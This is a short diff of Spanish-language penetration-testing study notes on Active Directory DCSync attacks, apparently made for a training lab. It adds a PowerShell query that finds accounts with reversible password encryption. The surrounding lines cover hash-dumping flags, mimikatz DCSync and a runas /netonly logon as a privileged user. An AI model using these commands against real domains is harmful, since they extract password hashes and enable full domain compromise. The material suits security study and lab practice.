@@ -26,6 +26,11 @@ Podemos también usar varias flags para extraer datos u objetivos puntuales:
 -just-dc-ntlm
 -just-dc-user <USERNAME>
 
+
+Buscar cuentas con reversible encryption en PS:
+
+Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
+
 #################################mimikatz para hacer DCsync
 Debemos correr mimikatz con la cuenta que tiene los privilegios requeridos. Para loguearnos podemos hacerlo desde el cmd con runas.exe:
 runas /netonly /user:INLANEFREIGHT\adunn powershell
